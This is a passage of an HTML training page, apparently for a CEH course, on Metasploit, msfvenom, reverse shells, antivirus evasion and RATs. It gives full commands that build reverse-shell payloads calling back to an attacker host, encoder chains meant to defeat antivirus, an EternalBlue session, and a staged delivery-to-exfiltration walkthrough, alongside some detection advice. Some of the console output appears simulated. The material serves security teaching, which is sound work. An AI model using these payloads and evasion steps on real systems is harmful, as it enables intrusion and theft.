@@ -1,0 +1,1656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>8_CEH - Metasploit, RAT & Post-Exploitation</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <h1><span class="gradient-text">8_CEH</span></h1>
+            <p>Metasploit Framework, Remote Access Trojans & Post-Exploitation Techniques</p>
+        </div>
+    </header>
+
+    <!-- Navigation Breadcrumb -->
+    <nav class="breadcrumb">
+        <span class="breadcrumb-item">8_CEH</span>
+        <span class="breadcrumb-separator">›</span>
+        <span class="breadcrumb-current" id="breadcrumb-current">Overview</span>
+    </nav>
+
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Sidebar Navigation -->
+        <aside class="sidebar">
+            <div class="sidebar-section">
+                <h3>Metasploit Basics</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab1')">Overview & Setup</a></li>
+                    <li><a href="#" onclick="switchTab('tab2')">Framework Architecture</a></li>
+                    <li><a href="#" onclick="switchTab('tab3')">Exploitation Modules</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Payload Generation</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab4')">Msfvenom Guide</a></li>
+                    <li><a href="#" onclick="switchTab('tab5')">Reverse Shells</a></li>
+                    <li><a href="#" onclick="switchTab('tab6')">Encoded Payloads</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>RAT Deployment</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab7')">RAT Fundamentals</a></li>
+                    <li><a href="#" onclick="switchTab('tab8')">Delivery Methods</a></li>
+                    <li><a href="#" onclick="switchTab('tab9')">C&C Communication</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Post-Exploitation</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab10')">Privilege Escalation</a></li>
+                    <li><a href="#" onclick="switchTab('tab11')">Lateral Movement</a></li>
+                    <li><a href="#" onclick="switchTab('tab12')">Data Exfiltration</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Advanced Topics</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab13')">Antivirus Evasion</a></li>
+                    <li><a href="#" onclick="switchTab('tab14')">Persistence Mechanisms</a></li>
+                    <li><a href="#" onclick="switchTab('tab15')">Resource Cleanup</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Defense & Summary</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab16')">Detection Methods</a></li>
+                    <li><a href="#" onclick="switchTab('tab17')">Mitigation Strategy</a></li>
+                    <li><a href="#" onclick="switchTab('tab18')">Summary & Quiz</a></li>
+                </ul>
+            </div>
+
+            <div class="scroll-to-top" onclick="scrollToTop()">↑ Top</div>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="content">
+            <!-- Tab 1: Overview -->
+            <section class="tab-content active" id="tab1">
+                <h2>Module 8: Metasploit & Post-Exploitation Framework</h2>
+                <p class="subtitle">Mastering penetration testing with the Metasploit Framework</p>
+                
+                <div class="info-card">
+                    <h3>Module Learning Objectives</h3>
+                    <ul>
+                        <li><strong>Metasploit Framework:</strong> Industry-standard penetration testing platform</li>
+                        <li><strong>Payload Generation:</strong> Create custom malware and reverse shells with msfvenom</li>
+                        <li><strong>Remote Access Trojans (RATs):</strong> Deploy persistent backdoors on target systems</li>
+                        <li><strong>Post-Exploitation:</strong> Escalate privileges, move laterally, steal data</li>
+                        <li><strong>Evasion Techniques:</strong> Bypass antivirus and security controls</li>
+                        <li><strong>Incident Detection:</strong> Identify Metasploit attacks in network logs</li>
+                    </ul>
+                </div>
+
+                <div class="threat-spectrum">
+                    <h3>Attack Progression: Initial Access to Full Control</h3>
+                    <div class="spectrum-visual">
+                        <div class="spectrum-item" data-threat="Low">Reconnaissance</div>
+                        <div class="spectrum-arrow">→</div>
+                        <div class="spectrum-item" data-threat="Medium">Exploitation</div>
+                        <div class="spectrum-arrow">→</div>
+                        <div class="spectrum-item" data-threat="High">Payload Exec</div>
+                        <div class="spectrum-arrow">→</div>
+                        <div class="spectrum-item" data-threat="Critical">C&C Control</div>
+                    </div>
+                </div>
+
+                <div class="learning-path">
+                    <h3>Learning Progression</h3>
+                    <div class="path-timeline">
+                        <div class="path-item">MSF Basics</div>
+                        <div class="path-arrow">→</div>
+                        <div class="path-item">Modules</div>
+                        <div class="path-arrow">→</div>
+                        <div class="path-item">Payloads</div>
+                        <div class="path-arrow">→</div>
+                        <div class="path-item">Handlers</div>
+                        <div class="path-arrow">→</div>
+                        <div class="path-item">Persistence</div>
+                        <div class="path-arrow">→</div>
+                        <div class="path-item">Defense</div>
+                    </div>
+                </div>
+
+                <div class="concept-box">
+                    <h3>Key Concepts</h3>
+                    <ul>
+                        <li><strong>Exploit:</strong> Code that takes advantage of vulnerability (only execution trigger)</li>
+                        <li><strong>Payload:</strong> Code that runs after exploitation (reverse shell, RAT, beacon)</li>
+                        <li><strong>Handler:</strong> Listener on attacker machine that catches reverse shells</li>
+                        <li><strong>Session:</strong> Active connection between attacker and compromised system</li>
+                        <li><strong>Post-Exploitation:</strong> Actions performed after initial compromise</li>
+                    </ul>
+                </div>
+
+                <div class="success-box">
+                    <strong>✓ Module Focus:</strong> This module covers the complete lifecycle of using Metasploit Framework for penetration testing, from reconnaissance through full system compromise and persistence.
+                </div>
+            </section>
+
+            <!-- Tab 2: Framework Architecture -->
+            <section class="tab-content" id="tab2">
+                <h2>Metasploit Framework Architecture</h2>
+                <p class="subtitle">Understanding MSF components and database structure</p>
+
+                <div class="concept-box">
+                    <h3>Metasploit Installation & Setup</h3>
+                    <ul>
+                        <li><strong>Primary OS:</strong> Kali Linux (pre-installed with MSF)</li>
+                        <li><strong>Alternative:</strong> Parrot OS, BlackArch, manual installation on Linux/macOS</li>
+                        <li><strong>Database Backend:</strong> PostgreSQL (required for workspace management)</li>
+                        <li><strong>Base Directory:</strong> /usr/share/metasploit-framework/</li>
+                        <li><strong>Interface Options:</strong> msfconsole (command-line), Armitage (GUI), REST API</li>
+                    </ul>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Starting Metasploit Framework</h3>
+                    <p><strong>Complete initialization sequence:</strong></p>
+                    
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 1:</span> Start PostgreSQL Database
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>$ sudo service postgresql start
+[sudo] password for kali:
+ * Starting PostgreSQL 13 database server   [ OK ]
+
+$ sudo systemctl status postgresql
+● postgresql.service - PostgreSQL RDBMS
+   Loaded: loaded (/lib/systemd/system/postgresql.service)
+   Active: active (running) since Mon 2026-04-14 10:00:00</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 2:</span> Initialize Metasploit Database
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>$ msfdb init
+[*] PostgreSQL is running
+[*] Creating database user 'msf'
+[*] Creating database 'msf'
+[*] Database created successfully
+[+] Database initialization complete</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 3:</span> Launch msfconsole
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>$ msfconsole
+
+       =[ metasploit v6.2.26
++ -- --=[ 2261 exploits - 1240 auxiliary - 404 post
++ -- --=[ 596 payloads - 47 encoders - 11 evasion
++ -- --=[ 1 nop
+
+msf6 > </code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 4:</span> Connect to Database
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>msf6 > db_connect
+[*] Connected to msf. Connection type: postgresql.
+
+msf6 > hosts
+[*] No hosts found
+
+msf6 > workspace
+default
+* default</code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="theory-card">
+                    <h3>MSF Core Components</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Component</th>
+                                <th>Purpose</th>
+                                <th>Examples</th>
+                                <th>Count (v6)</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Exploits</strong></td>
+                                <td>Triggers vulnerability for code execution</td>
+                                <td>EternalBlue, MS17-010, RCE modules</td>
+                                <td>2261</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Payloads</strong></td>
+                                <td>Code executed after exploitation</td>
+                                <td>reverse_tcp, meterpreter, shell</td>
+                                <td>596</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Encoders</strong></td>
+                                <td>Encode payload to bypass IDS/signature detection</td>
+                                <td>shikata_ga_nai, fnstenv_mov, jmp_api</td>
+                                <td>47</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Auxiliary</strong></td>
+                                <td>Scanning, enumeration, fuzzing, brute-force</td>
+                                <td>Port scanner, SMB scanner, HTTP fuzzer</td>
+                                <td>1240</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Post-Exploitation</strong></td>
+                                <td>Modules for post-compromise actions</td>
+                                <td>Privilege escalation, data exfilt, persistence</td>
+                                <td>404</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="info-card">
+                    <h3>Meterpreter: Advanced Payload</h3>
+                    <ul>
+                        <li><strong>Definition:</strong> Advanced multi-featured payload with remote shell access</li>
+                        <li><strong>In-Memory:</strong> Loaded entirely in RAM (harder to detect on disk)</li>
+                        <li><strong>Stageless vs Staged:</strong> Stageless = all payload at once; Staged = small stub downloads main payload</li>
+                        <li><strong>Commands:</strong> shell, hashdump, screenshot, webcam, key logging, file ops</li>
+                        <li><strong>Privilege Context:</strong> Runs as user who executes initial payload (use escalation for admin)</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 3: Exploitation Modules -->
+            <section class="tab-content" id="tab3">
+                <h2>Metasploit Exploitation Modules</h2>
+                <p class="subtitle">Using built-in exploits for known vulnerabilities</p>
+
+                <div class="info-card">
+                    <h3>Finding & Using Exploit Modules</h3>
+                    <ul>
+                        <li><strong>Search:</strong> Find exploits by platform, service, or CVE</li>
+                        <li><strong>Use:</strong> Select specific exploit to configure parameters</li>
+                        <li><strong>Show options:</strong> Display required and optional settings</li>
+                        <li><strong>Set:</strong> Configure RHOST, LHOST, port, payload, encoder</li>
+                        <li><strong>Run/Exploit:</strong> Execute the exploit against target</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Exploit Workflow Example: EternalBlue (MS17-010)</h3>
+                    <pre><code>msf6 > search ms17-010
+[*] Found 1 results
+1: exploit/windows/smb/ms17_010_eternalblue
+
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+   Name            Current Setting    Required
+   ----            ----------------    --------
+   RHOSTS          (no targets)        yes
+   RPORT           445                 yes
+   PAYLOAD         windows/meterpreter/reverse_tcp  yes
+   LHOST           192.168.1.100       yes
+   LPORT           4444                yes
+   ARCHITECTURE    x64                 yes
+   TARGET          Windows 7 SP1       yes
+   
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.50
+RHOSTS => 192.168.1.50
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.100
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+[*] Started reverse TCP handler on 192.168.1.100:4444
+[*] Target system selected: Windows 7 SP1
+[*] Sending payload (768 bytes)
+[+] Shell session 1 opened (192.168.1.100:4444 -> 192.168.1.50:54321)
+
+meterpreter ></code></pre>
+                </div>
+
+                <div class="danger-box">
+                    <strong>⚠️ CRITICAL EXPLOITATION PHASES:</strong>
+                    <ul>
+                        <li><strong>Vulnerability Check:</strong> Verify target is actually vulnerable</li>
+                        <li><strong>Encoder Selection:</strong> Use encoder to bypass IDS/antivirus</li>
+                        <li><strong>Payload Staging:</strong> Often required for larger payloads</li>
+                        <li><strong>Handler Ready:</strong> Start handler BEFORE running exploit</li>
+                        <li><strong>Immediate Persistence:</strong> Gain admin and install backdoor quickly</li>
+                    </ul>
+                </div>
+
+                <div class="concept-box">
+                    <h3>Popular Metasploit Exploits</h3>
+                    <ul>
+                        <li><strong>EternalBlue (MS17-010):</strong> Windows SMB RCE, affects 7-Server 2016</li>
+                        <li><strong>DoublePulsar:</strong> SMB backdoor, installed by EternalBlue</li>
+                        <li><strong>Apache RCE:</strong> CVE-2021-41773 (mod_cgi arbitrary command execution)</li>
+                        <li><strong>Adobe Reader:</strong> PDF exploits with arbitrary code execution</li>
+                        <li><strong>Java RCE:</strong> Deserialization exploits in Java applications</li>
+                        <li><strong>PHP RCE:</strong> Command injection in unsanitized input handling</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 4: Msfvenom Payload Generator -->
+            <section class="tab-content" id="tab4">
+                <h2>Msfvenom: Payload Generation Tool</h2>
+                <p class="subtitle">Creating custom payloads for targeted attacks</p>
+
+                <div class="concept-box">
+                    <h3>Msfvenom Basics</h3>
+                    <ul>
+                        <li><strong>Purpose:</strong> Generate standalone payloads without Metasploit</li>
+                        <li><strong>Formats:</strong> EXE, ELF, raw shellcode, Python, Ruby, PHP, VBA, ASP</li>
+                        <li><strong>Encoding:</strong> Built-in encoding to bypass signature detection</li>
+                        <li><strong>Independent:</strong> No database or console connection required</li>
+                        <li><strong>Batch Processing:</strong> Create multiple payloads programmatically</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Msfvenom Command Structure & Examples</h3>
+                    <pre><code># Basic reverse shell (TCP)
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f exe -o payload.exe
+[*] x86 - Windows Meterpreter (Staged TCP) - 341 bytes
+
+# Windows 64-bit with encoding
+msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=192.168.1.100 LPORT=443 \
+  -e x86/shikata_ga_nai -i 5 \
+  -f exe -o payload_encoded.exe
+[*] Encoder chain selected: x86/shikata_ga_nai
+[*] Number of iterations: 5
+
+# Linux reverse shell
+msfvenom -p linux/x86/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f elf -o payload.elf
+
+# Windows PowerShell payload
+msfvenom -p windows/meterpreter/reverse_https \
+  LHOST=192.168.1.100 LPORT=443 \
+  -f powershell -o payload.ps1
+
+# VBA macro for Office (Word/Excel)
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f vba -o macro.vba
+
+# Android APK
+msfvenom -p android/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -o payload.apk
+
+# List available payloads
+msfvenom -l payloads | grep windows
+msfvenom -l encoders
+msfvenom -l formats</code></pre>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Multi-Stage Payload Creation</h3>
+                    <p><strong>Staged Payload Benefits: Small initial stub downloads full malware</strong></p>
+                    
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Stage 1:</span> Create Small Stager (50KB)
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -f exe -o stager.exe
+[*] x86 - Windows Meterpreter (Staged TCP) - 341 bytes
+File size: ~50KB (includes small stub)</code>
+                            <p><strong>Advantage:</strong> Small enough to evade email filters, download via script</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Stage 2:</span> Setup HTTP Server for Stage 2
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0:80
+
+# Or setup on Metasploit
+msf6 > set PAYLOAD_OVERRIDE true
+msf6 > set PAYLOAD_FILE stage.bin</code>
+                            <p><strong>Full meterpreter (~5MB)</strong> served after initial execution</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Stage 3:</span> Deliver Stager to Victim
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <p><strong>Delivery Methods:</strong></p>
+                            <ul>
+                                <li>Email attachment: stager.exe</li>
+                                <li>Malicious webpage: Drive-by download</li>
+                                <li>USB drive: Physical delivery</li>
+                                <li>WinRAR vulnerability: Embedded in archive</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Stage 4:</span> Execution & Download
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code># On victim machine (infected)
+C:\Users\victim> stager.exe
+[PID: 5832]
+
+# Stager connects back to attacker
+GET /stage2.bin HTTP/1.1
+Host: 192.168.1.100
+
+# Full meterpreter downloaded and injected into memory</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Result:</span> Full Meterpreter Session
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>meterpreter > getuid
+Server username: CORP\victim@WORKSTATION
+
+meterpreter > getsystem
+[-] User is not part of admin group :(
+[*] Attempting privilege escalation...</code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-card">
+                    <h3>Encoding & Obfuscation</h3>
+                    <ul>
+                        <li><strong>XOR Encoding:</strong> Simple XOR cipher, easily reversed</li>
+                        <li><strong>Shikata Ga Nai:</strong> Polymorphic encoder, changes on each run</li>
+                        <li><strong>Multi-Pass Encoding:</strong> Apply encoder multiple times (-i flag)</li>
+                        <li><strong>Custom Encoders:</strong> Create Python script for AV evasion</li>
+                        <li><strong>Limitations:</strong> Modern EDR bypasses encoding, looks for behavioral patterns</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 5: Reverse Shells & Handlers -->
+            <section class="tab-content" id="tab5">
+                <h2>Reverse Shells & Handler Setup</h2>
+                <p class="subtitle">Establishing connection back to attacker from compromised system</p>
+
+                <div class="concept-box">
+                    <h3>Reverse Shell Fundamentals</h3>
+                    <ul>
+                        <li><strong>Direction:</strong> Victim initiates connection to attacker (bypasses firewall)</li>
+                        <li><strong>Advantage:</strong> Victim controls outbound traffic (not blocked like inbound)</li>
+                        <li><strong>Protocol:</strong> TCP, UDP, HTTPS, DNS tunneling possible</li>
+                        <li><strong>Execution:</strong> cmd.exe redirected to socket connection</li>
+                        <li><strong>Handler:</strong> Attacker listener waits for incoming connection</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Setting Up Reverse Shell Handler</h3>
+                    <pre><code># Method 1: Metasploit Handler
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0
+LHOST => 0.0.0.0
+
+msf6 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 0.0.0.0:4444
+[*] Starting the payload handler...
+
+# Victim connects back...
+[*] Sending stage (200262 bytes) to 192.168.1.50
+[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.50:54321)
+
+meterpreter >
+
+
+# Method 2: Netcat Listener (simple reverse shell)
+$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.1.100] from (UNKNOWN) [192.168.1.50] 54321
+
+C:\Windows\system32></code></pre>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Reverse Shell Execution Flow</h3>
+                    <p><strong>Complete process of establishing remote access</strong></p>
+                    
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 1:</span> Attacker Prepares Handler
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.1.100
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > run
+[*] Handler ready on 192.168.1.100:4444</code>
+                            <p><strong>Attacker Status:</strong> Listening on port 4444, awaiting connection</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 2:</span> Victim Executes Payload
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code># On victim machine
+C:\Users\victim\Downloads> payload.exe
+[Program starts]
+[Payload attempts connection to 192.168.1.100:4444]</code>
+                            <p><strong>Event:</strong> Victim system runs malicious EXE from Downloads</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 3:</span> Reverse Connection Established
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code># Network traffic
+[Victim initiates TCP connection to 192.168.1.100:4444]
+SYN: 192.168.1.50:54321 → 192.168.1.100:4444
+ACK: Connection successful
+
+# Attacker console
+[*] Sending stage (200262 bytes) to 192.168.1.50
+[*] Meterpreter session 1 opened</code>
+                            <p><strong>Connection Status:</strong> Encrypted channel now active</p>
+                        </div>
+                    </div>
+
+                    <div class="sim-step" onclick="toggleSimStep(this)">
+                        <div class="step-header">
+                            <span class="step-number">Step 4:</span> Command Execution
+                            <span class="toggle-icon">▼</span>
+                        </div>
+                        <div class="step-content">
+                            <code>meterpreter > getuid
+Server username: CORP\victim@WORKSTATION
+
+meterpreter > pwd
+C:\Users\victim
+
+meterpreter > ls
+[DirectoryName]  C:\Users\victim\Desktop\sensitive_data.zip
+
+meterpreter > download sensitive_data.zip /tmp/
+[*] Downloading: sensitive_data.zip -> /tmp/sensitive_data.zip
+[*] Downloaded 25MB in 4.2 seconds</code>
+                            <p><strong>Attacker Control:</strong> Full remote command execution achieved</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="defense-layer">
+                    <h3>Reverse Shell Detection</h3>
+                    
+                    <div class="mitigation-card">
+                        <h4>Network-Based Detection</h4>
+                        <ul>
+                            <li>Monitor for unusual outbound connections to non-standard ports</li>
+                            <li>Alert on processes connecting to unknown external IPs</li>
+                            <li>Detect encrypted TLS to suspicious endpoints</li>
+                            <li>Monitor DNS for malicious domain queries</li>
+                        </ul>
+                    </div>
+
+                    <div class="mitigation-card">
+                        <h4>Host-Based Detection</h4>
+                        <ul>
+                            <li>EDR monitors process creation and network connections</li>
+                            <li>Alert on suspicious process launching network connection</li>
+                            <li>Monitor for cmd.exe spawning from unusual parent process</li>
+                            <li>Track PowerShell launching with unusual parameters</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab 6: Payload Encoding & Evasion -->
+            <section class="tab-content" id="tab6">
+                <h2>Encoding & Antivirus Evasion</h2>
+                <p class="subtitle">Bypassing signature-based detection</p>
+
+                <div class="concept-box">
+                    <h3>Why Encoding Matters</h3>
+                    <ul>
+                        <li><strong>Signature Detection:</strong> AV looks for known malware patterns</li>
+                        <li><strong>Binary Signatures:</strong> Unmask suspicious bytes in executable</li>
+                        <li><strong>Polymorphic Code:</strong> Changes each execution, defeats static detection</li>
+                        <li><strong>Packing:</strong> Compress executable, decompress at runtime</li>
+                        <li><strong>Limitations:</strong> Modern EDR uses behavioral analysis, not just signatures</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Encoding Techniques</h3>
+                    <pre><code># Single-pass encoding
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -e x86/shikata_ga_nai \
+  -f exe -o payload_encoded1.exe
+
+# Multi-pass encoding (5 iterations)
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -e x86/shikata_ga_nai -i 5 \
+  -f exe -o payload_encoded5.exe
+
+# List available encoders
+msfvenom -l encoders
+[*] Valid Encoders
+   Name                    Rank       Description
+   ----                    ----       -----------
+   cmd/echo                good       Echo Encoder
+   cmd/powershell_base64   excellent  Powershell Base64 String Encoder
+   generic/eicar           manual     EICAR Encoder
+   x86/add_sub             low        Add/Sub Encoder
+   x86/fnstenv_mov         low        FPU Instructions Encoder
+   x86/jmp_call_additive   alternate  Jump/Call XOR Additive Feedback Encoder
+   x86/shikata_ga_nai      excellent  Polymorphic XOR Additive Feedback Encoder
+   x86/single_byte_xor     low        Single Byte XOR Encoder
+
+# Chain multiple encoders
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 LPORT=4444 \
+  -e x86/shikata_ga_nai -e x86/jmp_call_additive \
+  -i 3 \
+  -f exe -o payload_multi_encoded.exe</code></pre>
+                </div>
+
+                <div class="danger-box">
+                    <strong>🔴 LIMITATIONS OF ENCODING:</strong>
+                    <ul>
+                        <li><strong>Signature Evasion:</strong> Only bypasses file signature matching</li>
+                        <li><strong>Behavioral Detection:</strong> EDR still detects suspicious activity (process injection, network C&C)</li>
+                        <li><strong>Memory Analysis:</strong> Decoded payload visible in process memory</li>
+                        <li><strong>Heuristic Detection:</strong> Modern AV looks for encoder stubs + shellcode patterns</li>
+                        <li><strong>Frequency Analysis:</strong> Repeated XOR patterns detectable</li>
+                    </ul>
+                </div>
+
+                <div class="info-card">
+                    <h3>Modern AV/EDR Detection Bypass Methods</h3>
+                    <ul>
+                        <li><strong>Living off the Land:</strong> Use legitimate Windows tools (PowerShell, WMI, rundll32)</li>
+                        <li><strong>Code Injection:</strong> Inject into legitimate process (explorer.exe, svchost.exe)</li>
+                        <li><strong>DLL Sideloading:</strong> Load malicious DLL using trusted binary</li>
+                        <li><strong>Reflective DLL Injection:</strong> Load DLL without WriteFile/CreateRemoteThread</li>
+                        <li><strong>Memory-Only Execution:</strong> Never touch disk, decompress in RAM</li>
+                        <li><strong>Fileless Malware:</strong> Registry, WMI, or script-based execution</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 7: RAT Fundamentals -->
+            <section class="tab-content" id="tab7">
+                <h2>Remote Access Trojans (RAT) Fundamentals</h2>
+                <p class="subtitle">Understanding persistent backdoor capabilities</p>
+
+                <div class="concept-box">
+                    <h3>RAT Definition & Capabilities</h3>
+                    <ul>
+                        <li><strong>Remote Control:</strong> Full control of compromised system as if physically present</li>
+                        <li><strong>Persistence:</strong> Survives reboot through auto-start mechanisms</li>
+                        <li><strong>Stealth:</strong> Runs silently without user knowledge or detection</li>
+                        <li><strong>C&C Communication:</strong> Maintains connection to attacker's command server</li>
+                        <li><strong>Command Execution:</strong> Execute arbitrary code with system privileges</li>
+                        <li><strong>Data Access:</strong> Full file system access, credential harvesting</li>
+                    </ul>
+                </div>
+
+                <div class="info-card">
+                    <h3>Popular RAT Tools</h3>
+                    <ul>
+                        <li><strong>Metasploit Meterpreter:</strong> Free, open-source, extensive post-exploitation modules</li>
+                        <li><strong>Cobalt Strike Beacon:</strong> Commercial, used in APT campaigns, advanced evasion</li>
+                        <li><strong>Emotet:</strong> Banking malware, polymorphic, P2P communication</li>
+                        <li><strong>Agent Tesla:</strong> Credential stealer, keylogger, available for purchase</li>
+                        <li><strong>AsyncRAT:</strong> Open-source, used in cybercrime, supports C#</li>
+                        <li><strong>Remcos:</strong> Commercial/malware, screen capture, file access</li>
+                    </ul>
+                </div>
+
+                <div class="theory-card">
+                    <h3>RAT Capabilities vs Traditional Backdoor</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Feature</th>
+                                <th>Backdoor</th>
+                                <th>RAT (Remote Access Trojan)</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Remote Access</strong></td>
+                                <td>Basic shell only</td>
+                                <td>Full GUI control + shell</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Control Method</strong></td>
+                                <td>Command-line interface</td>
+                                <td>Interactive desktop, can click/type</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Persistence</strong></td>
+                                <td>May require manual setup</td>
+                                <td>Automatic auto-start mechanisms</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Capabilities</strong></td>
+                                <td>Limited (cmd execution)</td>
+                                <td>Extensive (webcam, mic, keylog, screenshot)</td>
+                            </tr>
+                            <tr>
+                                <td><strong>File Management</strong></td>
+                                <td>Basic file ops only</td>
+                                <td>Full SFTP-like file browser</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Stealth</strong></td>
+                                <td>Often visible in netstat</td>
+                                <td>Advanced evasion, hidden processes</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="success-box">
+                    <strong>✓ RAT TYPICAL WORKFLOW:</strong>
+                    <ul>
+                        <li>1. Initial Compromise: Email phishing, drive-by download, USB</li>
+                        <li>2. Payload Execution: User runs malware, RAT injected into memory</li>
